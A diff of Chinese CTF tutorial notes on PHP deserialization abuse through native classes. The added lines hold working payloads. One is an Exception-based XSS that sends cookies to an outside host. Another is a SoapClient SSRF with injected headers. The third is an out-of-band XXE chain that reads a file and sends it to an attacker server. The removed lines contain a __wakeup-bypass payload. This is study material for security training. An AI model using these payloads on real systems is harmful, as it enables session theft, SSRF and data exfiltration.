@@ -8,200 +8,118 @@
 
 ![image-20260110095553014](images/image-20260110095553014.png)
 
-\#PHP-属性类型-共有&私有&保护
+```
+#原生自带类参考
+https://xz.aliyun.com/news/8792
+https://www.anquanke.com/post/id/264823
+https://blog.csdn.net/cjdgg/article/details/115314651
 
-1、对象变量属性：
+#利用条件：
+1、有触发魔术方法
+2、魔术方法有利用类
+3、部分自带类拓展开启
 
-public(公共的):在本类内部、外部类、子类都可以访问
-
-protect(受保护的):只有本类或子类或父类中可以访问
-
-private(私人的):只有本类内部可以使用
-
-2、序列化数据显示：
-
-public属性序列化的时候格式是正常成员名
-
-private属性序列化的时候格式是%00类名%00成员名
-
-protect属性序列化的时候格式是%00*%00成员名
-
- 
-
+#生成原生类：
 <?php
-
-header("Content-type: text/html; charset=utf-8");
-
-//public private protected说明
-
-class test{
-
-  public $name="xiaodi";
-
-  private $age="31";
-
-  protected $sex="man";
-
+$classes = get_declared_classes();
+foreach ($classes as $class) {
+    $methods = get_class_methods($class);
+    foreach ($methods as $method) {
+        if (in_array($method, array(
+			'__construct',
+            '__destruct',
+            '__toString',
+            '__wakeup',
+            '__call',
+            '__callStatic',
+            '__get',
+            '__set',
+            '__isset',
+            '__unset',
+            '__invoke',
+            '__set_state'
+        ))) {
+            print $class . '::' . $method . "\n";
+        }
+    }
 }
 
-$a=new test();
-
-$a=serialize($a);
-
-print_r($a);
-
-?>
-
- 
-
-\#PHP-绕过漏洞-CVE&字符串逃逸
-
-1、CVE-2016-7124（__wakeup绕过）
-
-漏洞编号：CVE-2016-7124
-
-影响版本：PHP 5<5.6.25; PHP 7<7.0.10
-
-漏洞危害：如存在__wakeup方法，调用unserilize()方法前则先调用__wakeup方法，但序列化字符串中表示对象属性个数的值大于真实属性个数时会跳过__wakeup执行
-
- 
-
-Demo：见CVE.PHP与版本切换演示
-
- 
-
-案例：
-
-[极客大挑战 2019]PHP
-
-1、下载源码分析，触发flag条件
-
-2、分析会触发调用__wakeup 强制username值
-
-3、利用语言漏洞绕过 CVE-2016-7124
-
-4、构造payload后 修改满足漏洞条件触发
-
-Payload：
-
-select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
-
- 
-
-2、字符串逃逸
-
-字符变多-str1.php str1-pop.php
-
-字符变少-str2.php str2-pop.php
-
-案例——CTFSHOW-Web262（逃逸解法）
-
- 
-
-\#PHP-原生类Tips-获取&利用&配合
-
-参考案例：https://www.anquanke.com/post/id/264823
-
--PHP有那些原生类-见脚本使用
-
--常见使用的原生类-见参考案例
-
--原生类该怎么使用-见官方说明
-
-0、生成原生类
-
+1、使用Error/Exception类进行XSS
 <?php
-
-$classes = get_declared_classes();
-
-foreach ($classes as $class) {
-
-  $methods = get_class_methods($class);
-
-  foreach ($methods as $method) {
-
-​    if (in_array($method, array(
-
-​      '__destruct',
-
-​      '__toString',
-
-​      '__wakeup',
-
-​      '__call',
-
-​      '__callStatic',
-
-​      '__get',
-
-​      '__set',
-
-​      '__isset',
-
-​      '__unset',
-
-​      '__invoke',
-
-​      '__set_state'
-
-​    ))) {
-
-​      print $class . '::' . $method . "\n";
-
-​    }
-
-  }
-
-} 
-
- 
-
-1、本地Demo-xss
-
-<?php
-
 highlight_file(__file__);
-
-$a = unserialize($_GET['k']);
-
+$a = unserialize($_GET['code']);
 echo $a;
-
 ?>
-
 -输出对象可调用__toString
-
 -无代码通过原生类Exception
-
 -Exception使用查询编写利用
-
 -通过访问触发输出产生XSS漏洞
-
 <?php
-
 $a=new Exception("<script>alert('xiaodi')</script>");
-
 echo urlencode(serialize($a));
-
 ?>
 
- 
-
-2、CTFSHOW-259
-
--不存在的方法触发__call
-
--无代码通过原生类SoapClient
-
--SoapClient使用查询编写利用
-
--通过访问本地Flag.php获取Flag
-
+[BJDCTF 2nd]xss之光
 <?php
-
-$ua="aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
-
-$client=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));
-
-echo urlencode(serialize($client));
-
+$poc = new Exception("<script>window.open('http://462795d3-ea59-4f00-9657-d50f15178248.node5.buuoj.cn:81/?'+document.cookie);</script>");
+echo urlencode(serialize($poc));
 ?>
+
+2、使用SoapClient类进行SSRF
+<?php
+$s = unserialize($_GET['ssrf']);
+$s->a();
+?>
+-输出对象可调用__call
+-无代码通过原生类SoapClient
+-SoapClient使用查询编写利用
+-通过访问触发服务器SSRF漏洞
+<?php
+$a = new SoapClient(null,array('location'=>'http://192.168.1.4:2222/aaa', 'uri'=>'http://192.168.1.4:2222'));
+$b = serialize($a);
+echo $b;
+?>
+
+CTFSHOW-259
+-不存在的方法触发__call
+-无代码通过原生类SoapClient
+-SoapClient使用查询编写利用
+-通过访问本地Flag.php获取Flag
+<?php
+$ua="aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
+$client=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));
+echo urlencode(serialize($client));
+?>
+
+3、使用SimpleXMLElement类进行xxe
+<?php
+$sxe=new SimpleXMLElement('http://192.168.1.4:82/76/oob.xml',2,true);
+$a = serialize($sxe);
+echo $a;
+?>
+-不存在的方法触发__construct
+-无代码通过原生类SimpleXMLElement
+-SimpleXMLElement使用查询编写利用
+
+[SUCTF 2018]Homework
+利用点：SimpleXMLElement(url,2,true)
+oob.xml:
+<?xml version="1.0"?>
+<!DOCTYPE ANY[
+<!ENTITY % remote SYSTEM "http://ip/send.xml">
+%remote;
+%all;
+%send;
+]>
+send.xml:
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=x.php">
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://ip/send.php?file=%file;'>">
+send.php:
+<?php 
+file_put_contents("result.txt", $_GET['file']) ;
+?>
+Poc：
+/show.php?module=SimpleXMLElement&args[]=http://120.27.152.29/oob.xml&args[]=2&args[]=true
+
+```
+
